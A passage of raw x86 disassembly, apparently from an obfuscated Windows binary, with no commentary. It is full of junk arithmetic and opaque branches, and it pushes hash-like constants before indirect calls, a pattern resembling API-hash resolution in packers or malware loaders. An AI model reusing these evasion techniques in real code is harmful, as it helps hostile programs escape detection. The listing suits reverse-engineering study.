  41b2ab:	add    esi,edi
  41b2ad:	sub    DWORD PTR [ebp-0x30],edx
  41b2b0:	add    esi,esi
  41b2b2:	cmp    esi,DWORD PTR ds:0x45994c
  41b2b8:	je     0x41b2fe
  41b2ba:	mov    eax,ebx
  41b2bc:	sub    esi,edx
  41b2be:	mov    ecx,edi
  41b2c0:	and    ecx,eax
  41b2c2:	cmp    ecx,eax
  41b2c4:	je     0x41b2fe
  41b2c6:	mov    eax,DWORD PTR [ebp-0x30]
  41b2c9:	add    ecx,edi
  41b2cb:	cmp    esi,DWORD PTR ds:0x4599b4
  41b2d1:	je     0x41b2fe
  41b2d3:	sub    eax,ebx
  41b2d5:	sub    eax,ecx
  41b2d7:	mov    ebx,0x53
  41b2dc:	cmp    esi,0xa1bc
  41b2e2:	je     0x41b2fe
  41b2e4:	mov    ecx,DWORD PTR ds:0x459950
  41b2ea:	add    DWORD PTR [ebp-0x30],esi
  41b2ed:	mov    edx,ecx
  41b2ef:	add    DWORD PTR [ebp-0x30],eax
  41b2f2:	sub    edx,ebx
  41b2f4:	xor    DWORD PTR [ebp-0x30],edi
  41b2f7:	sub    edx,eax
  41b2f9:	and    edx,ecx
  41b2fb:	or     DWORD PTR [ebp-0x30],edx
  41b2fe:	add    ecx,ebx
  41b300:	mov    edx,DWORD PTR ds:0x459944
  41b306:	sub    edx,eax
  41b308:	mov    eax,DWORD PTR [ebp-0x30]
  41b30b:	sub    DWORD PTR [ebp-0x30],ecx
  41b30e:	add    eax,edi
  41b310:	add    eax,ecx
  41b312:	sub    edx,esi
  41b314:	cmp    eax,0xffffff94
  41b317:	jne    0x41b35a
  41b319:	add    DWORD PTR [ebp-0x30],eax
  41b31c:	mov    ebx,0xd8
  41b321:	mov    esi,DWORD PTR [ebp-0x30]
  41b324:	sub    esi,eax
  41b326:	test   esi,0xd8
  41b32c:	je     0x41b35a
  41b32e:	test   edx,0xdc
  41b334:	jne    0x41b35a
  41b336:	add    DWORD PTR [ebp-0x30],esi
  41b339:	cmp    edx,DWORD PTR ds:0x4599c8
  41b33f:	jne    0x41b35a
  41b341:	cmp    edx,edi
  41b343:	je     0x41b35a
  41b345:	sub    DWORD PTR [ebp-0x30],edi
  41b348:	mov    ecx,edx
  41b34a:	mov    eax,DWORD PTR [ebp-0x30]
  41b34d:	or     ecx,edi
  41b34f:	add    DWORD PTR [ebp-0x30],ecx
  41b352:	mov    DWORD PTR [ebp-0x4c],eax
  41b355:	add    ebx,ecx
  41b357:	add    DWORD PTR [ebp-0x4c],ebx
  41b35a:	or     DWORD PTR [ebp-0x30],esi
  41b35d:	mov    edx,DWORD PTR [ebp-0x30]
  41b360:	sub    edx,eax
  41b362:	cmp    edx,0x1d
  41b365:	jne    0x41b38d
  41b367:	mov    edi,DWORD PTR [ebp-0x30]
  41b36a:	add    edi,edx
  41b36c:	mov    esi,0x871a
  41b371:	cmp    ebx,DWORD PTR ds:0x459950
  41b377:	jne    0x41b38d
  41b379:	mov    eax,DWORD PTR [ebp-0x30]
  41b37c:	add    DWORD PTR [ebp-0x30],esi
  41b37f:	mov    ebx,DWORD PTR [ebp-0x30]
  41b382:	add    DWORD PTR [ebp-0x30],edi
  41b385:	add    DWORD PTR [ebp-0x30],ebx
  41b388:	and    eax,ebx
  41b38a:	xor    DWORD PTR [ebp-0x30],eax
  41b38d:	mov    esi,DWORD PTR ds:0x45992c
  41b393:	mov    edx,DWORD PTR ds:0x45992c
  41b399:	sub    DWORD PTR [ebp-0x30],edx
  41b39c:	sub    DWORD PTR [ebp-0x30],esi
  41b39f:	sub    DWORD PTR [ebp-0x30],edi
  41b3a2:	add    ebx,ebx
  41b3a4:	cmp    ebx,DWORD PTR [ebp-0x10]
  41b3a7:	jne    0x41b3d6
  41b3a9:	sub    ebx,esi
  41b3ab:	mov    edx,DWORD PTR [ebp-0x30]
  41b3ae:	mov    eax,DWORD PTR [ebp-0x30]
  41b3b1:	sub    eax,edi
  41b3b3:	sub    ebx,ecx
  41b3b5:	sub    edx,eax
  41b3b7:	cmp    edx,0xffffff88
  41b3ba:	jne    0x41b3d6
  41b3bc:	mov    edi,DWORD PTR [ebp-0x30]
  41b3bf:	sub    ebx,ecx
  41b3c1:	add    DWORD PTR [ebp-0x30],ebx
  41b3c4:	mov    ebx,esi
  41b3c6:	and    edi,ebx
  41b3c8:	and    DWORD PTR [ebp-0x30],edx
  41b3cb:	test   edi,0x81
  41b3d1:	je     0x41b3d6
  41b3d3:	add    DWORD PTR [ebp-0x30],edi
  41b3d6:	mov    edx,DWORD PTR [ebp-0x30]
  41b3d9:	add    edx,edx
  41b3db:	test   edx,0xe2
  41b3e1:	jne    0x41b3f8
  41b3e3:	cmp    edx,0x3e
  41b3e6:	je     0x41b3f8
  41b3e8:	mov    esi,0x6b
  41b3ed:	sub    edx,ebx
  41b3ef:	add    DWORD PTR [ebp-0x30],esi
  41b3f2:	or     DWORD PTR [ebp-0x30],eax
  41b3f5:	xor    DWORD PTR [ebp-0x30],edx
  41b3f8:	add    esi,esi
  41b3fa:	mov    ebx,DWORD PTR [ebp-0x30]
  41b3fd:	mov    edi,DWORD PTR ds:0x459970
  41b403:	add    esi,esi
  41b405:	add    DWORD PTR [ebp-0x30],ebx
  41b408:	sub    edi,ecx
  41b40a:	sub    edi,ecx
  41b40c:	sub    DWORD PTR [ebp-0x30],edi
  41b40f:	add    DWORD PTR [ebp-0x30],esi
  41b412:	and    ebx,eax
  41b414:	mov    eax,DWORD PTR [ebp-0x30]
  41b417:	or     ebx,ecx
  41b419:	sub    DWORD PTR [ebp-0x30],ebx
  41b41c:	mov    ecx,DWORD PTR ds:0x45993c
  41b422:	add    DWORD PTR [ebp-0x30],ecx
  41b425:	add    eax,eax
  41b427:	add    DWORD PTR [ebp-0x30],edi
  41b42a:	or     DWORD PTR [ebp-0x30],eax
  41b42d:	mov    edx,DWORD PTR [ebp-0x30]
  41b430:	cmp    edx,DWORD PTR ds:0x4599c0
  41b436:	jne    0x41b43b
  41b438:	sub    DWORD PTR [ebp-0x30],edx
  41b43b:	or     ecx,edi
  41b43d:	mov    edi,DWORD PTR [ebp-0x30]
  41b440:	mov    ebx,0xdf
  41b445:	sub    edi,eax
  41b447:	sub    ebx,edi
  41b449:	add    ecx,esi
  41b44b:	sub    ebx,eax
  41b44d:	test   eax,0xf4
  41b452:	jne    0x41b480
  41b454:	mov    eax,DWORD PTR ds:0x45996c
  41b45a:	sub    DWORD PTR [ebp-0x30],ebx
  41b45d:	mov    ebx,DWORD PTR ds:0x459948
  41b463:	add    DWORD PTR [ebp-0x30],ecx
  41b466:	cmp    edi,DWORD PTR [ebp-0x10]
  41b469:	jne    0x41b480
  41b46b:	mov    esi,ebx
  41b46d:	mov    ecx,DWORD PTR [ebp-0x30]
  41b470:	add    DWORD PTR [ebp-0x30],ecx
  41b473:	sub    esi,eax
  41b475:	sub    DWORD PTR [ebp-0x30],edi
  41b478:	add    edx,ecx
  41b47a:	add    DWORD PTR [ebp-0x30],esi
  41b47d:	add    DWORD PTR [ebp-0x30],edx
  41b480:	mov    esi,DWORD PTR [ebp-0x30]
  41b483:	or     DWORD PTR [ebp-0x30],esi
  41b486:	cmp    esi,0x59b4
  41b48c:	je     0x41b491
  41b48e:	or     DWORD PTR [ebp-0x30],edx
  41b491:	sub    esi,edx
  41b493:	sub    esi,eax
  41b495:	and    esi,edi
  41b497:	mov    ebx,DWORD PTR [ebp-0x30]
  41b49a:	mov    edx,0xa4
  41b49f:	add    esi,edi
  41b4a1:	cmp    esi,DWORD PTR ds:0x45999c
  41b4a7:	je     0x41b4c5
  41b4a9:	and    esi,edx
  41b4ab:	add    esi,edx
  41b4ad:	test   esi,0x63
  41b4b3:	jne    0x41b4c5
  41b4b5:	sub    DWORD PTR [ebp-0x30],esi
  41b4b8:	or     ebx,eax
  41b4ba:	cmp    ebx,0x7591
  41b4c0:	je     0x41b4c5
  41b4c2:	xor    DWORD PTR [ebp-0x30],ebx
  41b4c5:	cmp    ebx,edi
  41b4c7:	je     0x41b4e4
  41b4c9:	cmp    edi,DWORD PTR [ebp-0x1c]
  41b4cc:	je     0x41b4e4
  41b4ce:	test   esi,0x6539
  41b4d4:	jne    0x41b4e4
  41b4d6:	test   ecx,0x57
  41b4dc:	jne    0x41b4e4
  41b4de:	mov    ecx,DWORD PTR [ebp-0x30]
  41b4e1:	add    DWORD PTR [ebp-0x30],ecx
  41b4e4:	cmp    esi,0x24
  41b4e7:	jne    0x41b4ec
  41b4e9:	add    DWORD PTR [ebp-0x30],ecx
  41b4ec:	sub    eax,esi
  41b4ee:	add    DWORD PTR [ebp-0x30],ecx
  41b4f1:	mov    ebx,esi
  41b4f3:	cmp    ecx,DWORD PTR ds:0x459944
  41b4f9:	jne    0x41b603
  41b4ff:	test   ebx,0x1a
  41b505:	je     0x41b603
  41b50b:	cmp    esi,0xd90e
  41b511:	je     0x41b603
  41b517:	sub    DWORD PTR [ebp-0x30],ebx
  41b51a:	sub    eax,ecx
  41b51c:	mov    ecx,edi
  41b51e:	mov    edx,DWORD PTR [ebp-0x30]
  41b521:	add    edx,eax
  41b523:	cmp    ecx,0xfffffff2
  41b526:	je     0x41b603
  41b52c:	mov    edi,DWORD PTR [ebp-0x30]
  41b52f:	mov    eax,DWORD PTR [ebp-0x30]
  41b532:	sub    DWORD PTR [ebp-0x30],eax
  41b535:	add    DWORD PTR [ebp-0x30],edi
  41b538:	sub    DWORD PTR [ebp-0x30],eax
  41b53b:	add    DWORD PTR [ebp-0x30],edx
  41b53e:	and    DWORD PTR [ebp-0x30],edi
  41b541:	cmp    ecx,esi
  41b543:	je     0x41b603
  41b549:	cmp    ecx,0xd
  41b54c:	je     0x41b603
  41b552:	mov    eax,0x18
  41b557:	mov    esi,0xdb24
  41b55c:	add    eax,ebx
  41b55e:	add    ecx,ecx
  41b560:	cmp    eax,0xffffff91
  41b563:	jne    0x41b603
  41b569:	and    DWORD PTR [ebp-0x30],esi
  41b56c:	mov    edi,0x43
  41b571:	add    ecx,edx
  41b573:	mov    ebx,DWORD PTR [ebp-0x30]
  41b576:	add    DWORD PTR [ebp-0x30],eax
  41b579:	sub    ecx,eax
  41b57b:	cmp    ebx,eax
  41b57d:	jne    0x41b603
  41b583:	mov    eax,DWORD PTR [ebp-0x30]
  41b586:	add    DWORD PTR [ebp-0x30],ebx
  41b589:	mov    esi,DWORD PTR [ebp-0x30]
  41b58c:	cmp    edx,0xf5a7
  41b592:	je     0x41b603
  41b594:	cmp    ecx,eax
  41b596:	jne    0x41b603
  41b598:	mov    edx,0x97
  41b59d:	mov    edx,DWORD PTR [ebp-0x30]
  41b5a0:	cmp    edx,0xad77
  41b5a6:	je     0x41b603
  41b5a8:	mov    ebx,DWORD PTR [ebp-0x30]
  41b5ab:	test   ebx,0x56
  41b5b1:	je     0x41b603
  41b5b3:	mov    edi,DWORD PTR [ebp-0x30]
  41b5b6:	mov    DWORD PTR [ebp-0x30],edi
  41b5b9:	add    eax,esi
  41b5bb:	cmp    ecx,DWORD PTR [ebp-0x34]
  41b5be:	jne    0x41b603
  41b5c0:	test   edx,0xfd
  41b5c6:	jne    0x41b603
  41b5c8:	mov    edi,DWORD PTR [ebp-0x30]
  41b5cb:	or     edi,ebx
  41b5cd:	mov    ebx,ecx
  41b5cf:	cmp    eax,ebx
  41b5d1:	je     0x41b603
  41b5d3:	mov    ecx,0xa3
  41b5d8:	mov    esi,DWORD PTR ds:0x459944
  41b5de:	add    ecx,edi
  41b5e0:	sub    DWORD PTR [ebp-0x30],ecx
  41b5e3:	cmp    edi,DWORD PTR ds:0x4599c8
  41b5e9:	jne    0x41b603
  41b5eb:	add    DWORD PTR [ebp-0x30],edx
  41b5ee:	mov    ecx,DWORD PTR [ebp-0x30]
  41b5f1:	add    DWORD PTR [ebp-0x30],eax
  41b5f4:	mov    edi,DWORD PTR [ebp-0x30]
  41b5f7:	sub    DWORD PTR [ebp-0x30],ebx
  41b5fa:	mov    DWORD PTR [ebp-0x30],edi
  41b5fd:	add    DWORD PTR [ebp-0x30],ecx
  41b600:	sub    DWORD PTR [ebp-0x30],esi
  41b603:	lea    ecx,[ebp-0x2c]
  41b606:	add    DWORD PTR [ebp-0x30],ecx
  41b609:	mov    edi,0xde
  41b60e:	add    DWORD PTR [ebp-0x30],edi
  41b611:	push   ecx
  41b612:	add    edx,eax
  41b614:	or     DWORD PTR [ebp-0x30],esi
  41b617:	sub    edx,ebx
  41b619:	add    DWORD PTR [ebp-0x30],edx
  41b61c:	push   0xf5de52be
  41b621:	mov    edi,DWORD PTR [ebp-0x30]
  41b624:	mov    ebx,0x4b52
  41b629:	add    edi,eax
  41b62b:	sub    edi,ecx
  41b62d:	sub    DWORD PTR [ebp-0x30],ecx
  41b630:	sub    edi,ebx
  41b632:	add    edi,edi
  41b634:	sub    DWORD PTR [ebp-0x30],edi
  41b637:	mov    edi,DWORD PTR [ebp-0x30]
  41b63a:	cmp    edi,DWORD PTR ds:0x4599c0
  41b640:	je     0x41b662
  41b642:	mov    esi,0xd3a0
  41b647:	mov    edx,DWORD PTR ds:0x4599c0
  41b64d:	sub    esi,edi
  41b64f:	add    edx,eax
  41b651:	and    edx,ebx
  41b653:	or     edx,esi
  41b655:	and    edx,edi
  41b657:	or     edx,ecx
  41b659:	add    edx,ecx
  41b65b:	add    edx,ebx
  41b65d:	add    edx,edi
  41b65f:	sub    DWORD PTR [ebp-0x30],edx
  41b662:	call   0x41bb30
  41b667:	mov    edi,DWORD PTR ds:0x459934
  41b66d:	sub    edi,ebx
  41b66f:	mov    ecx,0xe8
  41b674:	add    edi,eax
  41b676:	sub    DWORD PTR [ebp-0x30],ecx
  41b679:	sub    DWORD PTR [ebp-0x30],ecx
  41b67c:	sub    DWORD PTR [ebp-0x30],edi
  41b67f:	mov    edx,DWORD PTR [ebp-0x2c]
  41b682:	mov    ebx,DWORD PTR [ebp-0x30]
  41b685:	cmp    edx,0xffffffaa
  41b688:	je     0x41b754
  41b68e:	mov    esi,DWORD PTR [ebp-0x30]
  41b691:	add    esi,ecx
  41b693:	add    esi,esi
  41b695:	cmp    ebx,0xfffffff7
  41b698:	jne    0x41b754
  41b69e:	cmp    edx,esi
  41b6a0:	je     0x41b754
  41b6a6:	and    esi,edx
  41b6a8:	mov    eax,DWORD PTR [ebp-0x30]
  41b6ab:	mov    edi,0x1281020
  41b6b0:	cmp    eax,edx
  41b6b2:	je     0x41b754
  41b6b8:	cmp    edx,DWORD PTR [ebp-0x38]
  41b6bb:	je     0x41b754
  41b6c1:	add    eax,eax
  41b6c3:	add    esi,esi
  41b6c5:	cmp    ebx,DWORD PTR [ebp-0x10]
  41b6c8:	jne    0x41b754
  41b6ce:	mov    ecx,DWORD PTR [ebp-0x30]
  41b6d1:	mov    DWORD PTR [ebp-0x30],eax
  41b6d4:	mov    eax,esi
  41b6d6:	sub    DWORD PTR [ebp-0x30],ecx
  41b6d9:	sub    DWORD PTR [ebp-0x30],ebx
  41b6dc:	sub    eax,esi
  41b6de:	add    edi,ecx
  41b6e0:	sub    DWORD PTR [ebp-0x30],eax
  41b6e3:	cmp    eax,0xffffffaf
  41b6e6:	je     0x41b754
  41b6e8:	mov    esi,DWORD PTR ds:0x4599b4
  41b6ee:	mov    eax,DWORD PTR [ebp-0x30]
  41b6f1:	cmp    eax,DWORD PTR ds:0x45999c
  41b6f7:	je     0x41b754
  41b6f9:	sub    edi,ecx
  41b6fb:	cmp    edi,esi
  41b6fd:	jne    0x41b754
  41b6ff:	cmp    edi,esi
  41b701:	je     0x41b754
  41b703:	mov    ecx,edx
  41b705:	add    eax,edx
  41b707:	or     DWORD PTR [ebp-0x30],ecx
  41b70a:	test   edi,0x7b
  41b710:	je     0x41b754
  41b712:	mov    ecx,DWORD PTR [ebp-0x30]
  41b715:	mov    ebx,DWORD PTR ds:0x45996c
  41b71b:	sub    ebx,edx
  41b71d:	mov    DWORD PTR [ebp-0x30],eax
  41b720:	cmp    ecx,0x75
  41b723:	jne    0x41b754
  41b725:	mov    eax,DWORD PTR [ebp-0x30]
  41b728:	sub    ecx,edi
  41b72a:	sub    DWORD PTR [ebp-0x30],ebx
  41b72d:	mov    ebx,0xf0
  41b732:	and    DWORD PTR [ebp-0x30],ecx
  41b735:	xor    DWORD PTR [ebp-0x30],ebx
  41b738:	cmp    eax,0x4de9
  41b73d:	jne    0x41b754
  41b73f:	mov    esi,DWORD PTR [ebp-0x30]
  41b742:	and    esi,eax
  41b744:	add    esi,edi
  41b746:	mov    ebx,DWORD PTR [ebp-0x30]
  41b749:	mov    DWORD PTR [ebp-0x30],edx
  41b74c:	add    ebx,eax
  41b74e:	xor    DWORD PTR [ebp-0x30],esi
  41b751:	add    DWORD PTR [ebp-0x30],ebx
  41b754:	shr    edx,0x10
  41b757:	sub    DWORD PTR [ebp-0x30],edx
  41b75a:	cmp    edx,0xca1c
  41b760:	jne    0x41b991
  41b766:	cmp    eax,0x5f
  41b769:	je     0x41b784
  41b76b:	sub    ecx,esi
  41b76d:	add    ecx,ebx
  41b76f:	cmp    ecx,DWORD PTR [ebp-0x18]
  41b772:	jne    0x41b784
  41b774:	cmp    ecx,DWORD PTR [ebp-0x40]
  41b777:	jne    0x41b784
  41b779:	mov    eax,0x7a
  41b77e:	xor    DWORD PTR [ebp-0x30],ecx
  41b781:	mov    DWORD PTR [ebp-0x30],eax
  41b784:	mov    edi,0xca5e81fa
  41b789:	mov    esi,edi
  41b78b:	sub    esi,edx
  41b78d:	mov    eax,0x2e
  41b792:	sub    DWORD PTR [ebp-0x30],eax
  41b795:	add    DWORD PTR [ebp-0x30],edx
  41b798:	sub    esi,ebx
  41b79a:	or     esi,ecx
  41b79c:	cmp    esi,DWORD PTR [ebp-0x24]
  41b79f:	jne    0x41b7b5
  41b7a1:	sub    esi,eax
  41b7a3:	sub    esi,ecx
  41b7a5:	test   esi,0x3b
  41b7ab:	jne    0x41b7b5
  41b7ad:	cmp    esi,DWORD PTR [ebp-0x40]
  41b7b0:	je     0x41b7b5
  41b7b2:	add    DWORD PTR [ebp-0x30],esi
  41b7b5:	sub    edi,DWORD PTR [ebp-0x2c]
  41b7b8:	sub    eax,ebx
  41b7ba:	cmp    eax,0xc01b
  41b7bf:	jne    0x41b824
  41b7c1:	sub    eax,edi
  41b7c3:	mov    edx,eax
  41b7c5:	cmp    edx,DWORD PTR [ebp-0x28]
  41b7c8:	jne    0x41b824
  41b7ca:	mov    ecx,DWORD PTR [ebp-0x30]
  41b7cd:	test   edx,0x37ec
  41b7d3:	je     0x41b824
  41b7d5:	mov    ebx,DWORD PTR [ebp-0x30]
  41b7d8:	mov    eax,DWORD PTR ds:0x459994
  41b7de:	sub    DWORD PTR [ebp-0x30],edi
  41b7e1:	cmp    ecx,DWORD PTR ds:0x459994
  41b7e7:	jne    0x41b824
  41b7e9:	mov    esi,0x42
  41b7ee:	add    DWORD PTR [ebp-0x30],edx
  41b7f1:	sub    DWORD PTR [ebp-0x30],edx
  41b7f4:	sub    DWORD PTR [ebp-0x30],ecx
  41b7f7:	and    DWORD PTR [ebp-0x30],ebx
  41b7fa:	and    eax,esi
  41b7fc:	add    eax,eax
  41b7fe:	cmp    edi,0x40
  41b801:	jne    0x41b806
  41b803:	mov    DWORD PTR [ebp-0x30],ebx
  41b806:	sub    eax,edi
  41b808:	cmp    edx,DWORD PTR ds:0x45993c
  41b80e:	je     0x41b824
  41b810:	mov    esi,DWORD PTR ds:0x459934
  41b816:	and    DWORD PTR [ebp-0x30],eax
  41b819:	mov    edx,0x1f29
  41b81e:	add    DWORD PTR [ebp-0x30],edx
  41b821:	add    DWORD PTR [ebp-0x30],esi
  41b824:	call   edi
  41b826:	sub    DWORD PTR [ebp-0x30],edi
  41b829:	mov    DWORD PTR [ebp-0xc],eax
  41b82c:	cmp    ebx,edi
  41b82e:	jne    0x41b83b
  41b830:	cmp    edi,DWORD PTR ds:0x45994c
  41b836:	je     0x41b83b
  41b838:	sub    DWORD PTR [ebp-0x30],eax
  41b83b:	mov    eax,0x41c6e3
  41b840:	sub    DWORD PTR [ebp-0x30],eax
  41b843:	push   DWORD PTR [ebp-0x2c]
  41b846:	push   0xca1e07cc
  41b84b:	push   DWORD PTR [ebp-0xc]
  41b84e:	call   eax
  41b850:	mov    edx,DWORD PTR ds:0x4599c0
  41b856:	add    edx,ebx
  41b858:	mov    DWORD PTR [ebp-0x30],edx
  41b85b:	add    DWORD PTR [ebp-0xc],0x14
  41b862:	add    edx,ebx
  41b864:	mov    ebx,DWORD PTR [ebp-0x30]
  41b867:	and    edx,ebx
  41b869:	and    edx,ebx
  41b86b:	sub    DWORD PTR [ebp-0x30],edx
  41b86e:	mov    eax,DWORD PTR [ebp-0xc]
  41b871:	sub    DWORD PTR [ebp-0x30],edx
  41b874:	call   eax
  41b876:	mov    edi,DWORD PTR [ebp-0x30]
  41b879:	add    DWORD PTR [ebp-0x30],esi
  41b87c:	mov    eax,DWORD PTR [ebp-0x30]
  41b87f:	add    eax,ebx
  41b881:	cmp    eax,0x6d
  41b884:	jne    0x41b980
  41b88a:	add    edi,esi
  41b88c:	sub    eax,esi
  41b88e:	add    edi,edi
  41b890:	mov    edx,DWORD PTR ds:0x459950
  41b896:	mov    ecx,0x19
  41b89b:	add    DWORD PTR [ebp-0x30],edi
  41b89e:	sub    DWORD PTR [ebp-0x30],edx
  41b8a1:	sub    eax,edi
  41b8a3:	and    ecx,ebx
  41b8a5:	and    eax,edi
  41b8a7:	test   eax,0xb9
  41b8ac:	jne    0x41b980
  41b8b2:	sub    eax,edi
  41b8b4:	test   ecx,0x96
  41b8ba:	je     0x41b980
  41b8c0:	mov    ebx,eax
  41b8c2:	mov    edx,DWORD PTR [ebp-0x30]
  41b8c5:	add    edx,eax
  41b8c7:	or     DWORD PTR [ebp-0x30],ecx
  41b8ca:	cmp    edx,DWORD PTR ds:0x4599a4
  41b8d0:	je     0x41b980
  41b8d6:	mov    edi,0x89
  41b8db:	and    edi,edx
  41b8dd:	add    DWORD PTR [ebp-0x30],edi
  41b8e0:	add    DWORD PTR [ebp-0x30],eax
  41b8e3:	sub    ebx,edi
  41b8e5:	add    ebx,ecx
  41b8e7:	mov    edx,DWORD PTR ds:0x4599bc
  41b8ed:	add    ebx,esi
  41b8ef:	sub    edx,edi
  41b8f1:	cmp    eax,edi
  41b8f3:	jne    0x41b980
  41b8f9:	sub    DWORD PTR [ebp-0x30],edi
  41b8fc:	add    ebx,eax
  41b8fe:	cmp    ebx,DWORD PTR [ebp-0x34]
  41b901:	jne    0x41b980
  41b903:	add    edx,eax
  41b905:	mov    eax,0x88
  41b90a:	mov    esi,DWORD PTR [ebp-0x30]
  41b90d:	add    eax,ebx
  41b90f:	add    DWORD PTR [ebp-0x30],edx
  41b912:	add    DWORD PTR [ebp-0x30],eax
  41b915:	cmp    esi,0xffffff8b
  41b918:	jne    0x41b980
  41b91a:	mov    ebx,0xa9
  41b91f:	mov    ecx,DWORD PTR [ebp-0x30]
  41b922:	sub    DWORD PTR [ebp-0x30],ecx
  41b925:	cmp    esi,0x16
  41b928:	jne    0x41b980
  41b92a:	mov    edx,0xbd
  41b92f:	mov    ecx,eax
  41b931:	sub    DWORD PTR [ebp-0x30],eax
  41b934:	test   ecx,0x89
  41b93a:	jne    0x41b980
  41b93c:	mov    edi,DWORD PTR [ebp-0x30]
  41b93f:	cmp    edi,ebx
  41b941:	je     0x41b980
  41b943:	mov    eax,DWORD PTR ds:0x459948
  41b949:	mov    edx,DWORD PTR [ebp-0x30]
  41b94c:	cmp    edx,0x9500481
  41b952:	jne    0x41b980
  41b954:	and    edx,esi
  41b956:	add    edx,edx
  41b958:	and    ecx,edi
  41b95a:	test   esi,0x7
  41b960:	jne    0x41b980
  41b962:	cmp    edx,edi
  41b964:	je     0x41b980
  41b966:	test   ecx,0x2c
  41b96c:	je     0x41b980
  41b96e:	mov    edi,DWORD PTR [ebp-0x30]
  41b971:	and    edx,eax
  41b973:	mov    eax,edi
  41b975:	add    DWORD PTR [ebp-0x30],eax
  41b978:	add    ecx,ebx
  41b97a:	sub    DWORD PTR [ebp-0x30],ecx
  41b97d:	sub    DWORD PTR [ebp-0x30],edx
  41b980:	add    DWORD PTR [ebp-0x30],esi
  41b983:	mov    ecx,DWORD PTR [ebp-0x30]
  41b986:	add    ecx,eax
  41b988:	mov    eax,DWORD PTR [ebp-0x30]
  41b98b:	add    DWORD PTR [ebp-0x30],ecx
  41b98e:	add    DWORD PTR [ebp-0x30],eax
  41b991:	or     esi,ecx
  41b993:	mov    eax,DWORD PTR [ebp-0x30]
  41b996:	sub    DWORD PTR [ebp-0x30],esi
  41b999:	add    DWORD PTR [ebp-0x30],eax
  41b99c:	mov    edx,ecx
  41b99e:	mov    ebx,DWORD PTR [ebp-0x30]
  41b9a1:	xor    DWORD PTR [ebp-0x30],ebx
  41b9a4:	sub    edx,edi
  41b9a6:	cmp    edi,0xffffffb0
  41b9a9:	je     0x41ba75
  41b9af:	mov    edi,DWORD PTR ds:0x4599b4
  41b9b5:	add    edx,eax
  41b9b7:	sub    edi,eax
  41b9b9:	mov    ebx,0x56a9
  41b9be:	cmp    ecx,0x28
  41b9c1:	jne    0x41ba75
  41b9c7:	and    edi,ebx
  41b9c9:	cmp    edx,0xffffffab
  41b9cc:	jne    0x41ba75
  41b9d2:	mov    ecx,edx
  41b9d4:	or     edi,esi
  41b9d6:	and    edi,ebx
  41b9d8:	sub    edi,esi
  41b9da:	cmp    edi,ecx
  41b9dc:	jne    0x41ba75
  41b9e2:	and    ecx,eax
  41b9e4:	and    edi,eax
  41b9e6:	mov    ebx,edi
  41b9e8:	mov    eax,DWORD PTR [ebp-0x30]
  41b9eb:	sub    ecx,ebx
  41b9ed:	cmp    eax,ecx
  41b9ef:	je     0x41ba75
  41b9f5:	mov    edx,DWORD PTR ds:0x459948
  41b9fb:	mov    edi,DWORD PTR [ebp-0x30]
  41b9fe:	cmp    edi,DWORD PTR [ebp-0x3c]
  41ba01:	jne    0x41ba75
  41ba03:	cmp    edi,DWORD PTR ds:0x459944
  41ba09:	je     0x41ba75
  41ba0b:	mov    ebx,0xeb
  41ba10:	mov    esi,DWORD PTR ds:0x459934
  41ba16:	cmp    ecx,DWORD PTR ds:0x4599bc
  41ba1c:	je     0x41ba75
  41ba1e:	cmp    ecx,0xffffffa7
  41ba21:	jne    0x41ba75
  41ba23:	sub    DWORD PTR [ebp-0x30],eax
  41ba26:	sub    DWORD PTR [ebp-0x30],ebx
  41ba29:	cmp    ecx,0xfffffff4
  41ba2c:	jne    0x41ba75
  41ba2e:	cmp    edi,eax
  41ba30:	jne    0x41ba75
  41ba32:	mov    ebx,DWORD PTR [ebp-0x30]
  41ba35:	add    edi,ebx
  41ba37:	mov    ebx,DWORD PTR [ebp-0x30]
  41ba3a:	and    DWORD PTR [ebp-0x30],ebx
  41ba3d:	add    edi,eax
  41ba3f:	sub    DWORD PTR [ebp-0x30],edx
  41ba42:	xor    DWORD PTR [ebp-0x30],ebx
  41ba45:	cmp    ecx,DWORD PTR ds:0x45994c
  41ba4b:	je     0x41ba75
  41ba4d:	add    DWORD PTR [ebp-0x30],edi
  41ba50:	mov    eax,DWORD PTR [ebp-0x30]
  41ba53:	add    esi,ebx
  41ba55:	mov    edi,edx
  41ba57:	mov    DWORD PTR [ebp-0x50],esi
  41ba5a:	cmp    ecx,0x40
  41ba5d:	jne    0x41ba75
  41ba5f:	sub    DWORD PTR [ebp-0x30],eax
  41ba62:	add    edi,ecx
  41ba64:	mov    eax,DWORD PTR [ebp-0x50]
  41ba67:	add    DWORD PTR [ebp-0x30],ebx
  41ba6a:	mov    esi,DWORD PTR [ebp-0x30]
  41ba6d:	sub    edi,eax
  41ba6f:	or     DWORD PTR [ebp-0x30],edi
  41ba72:	add    DWORD PTR [ebp-0x30],esi
  41ba75:	mov    edi,DWORD PTR [ebp-0x30]
  41ba78:	mov    esi,DWORD PTR [ebp-0x30]
  41ba7b:	add    edi,edi
  41ba7d:	mov    DWORD PTR [ebp-0x4],esi
  41ba80:	add    DWORD PTR [ebp-0x30],edi
  41ba83:	pop    edi
  41ba84:	cmp    edi,DWORD PTR [ebp-0x50]
  41ba87:	jne    0x41baa4
  41ba89:	test   edi,0xe3
  41ba8f:	je     0x41baa4
  41ba91:	cmp    edi,DWORD PTR [ebp-0x44]
  41ba94:	jne    0x41baa4
  41ba96:	mov    ebx,DWORD PTR [ebp-0x30]
  41ba99:	mov    ecx,0x49
  41ba9e:	or     DWORD PTR [ebp-0x4],ecx
  41baa1:	mov    DWORD PTR [ebp-0x30],ebx
  41baa4:	pop    esi
  41baa5:	add    DWORD PTR [ebp-0x4],esi
  41baa8:	pop    ebx
  41baa9:	mov    eax,0x56
  41baae:	add    eax,ecx
  41bab0:	mov    ecx,edx
  41bab2:	cmp    ebx,0xf413
  41bab8:	je     0x41bb29
  41baba:	mov    eax,DWORD PTR [ebp-0x30]
  41babd:	mov    edx,0xb3
  41bac2:	mov    DWORD PTR [ebp-0x4],ebx
  41bac5:	or     DWORD PTR [ebp-0x30],edx
  41bac8:	add    DWORD PTR [ebp-0x4],eax
  41bacb:	sub    ecx,edi
  41bacd:	cmp    ebx,DWORD PTR [ebp-0x24]
  41bad0:	je     0x41bb29
  41bad2:	mov    edx,DWORD PTR [ebp-0x4]
  41bad5:	mov    eax,edi
  41bad7:	sub    eax,edi
  41bad9:	cmp    ecx,edi
  41badb:	je     0x41bb29
  41badd:	add    edx,ecx
  41badf:	mov    ecx,DWORD PTR [ebp-0x4]
  41bae2:	cmp    edi,0xe835
  41bae8:	jne    0x41bb29
  41baea:	sub    DWORD PTR [ebp-0x30],eax
  41baed:	cmp    ecx,0xffffff8a
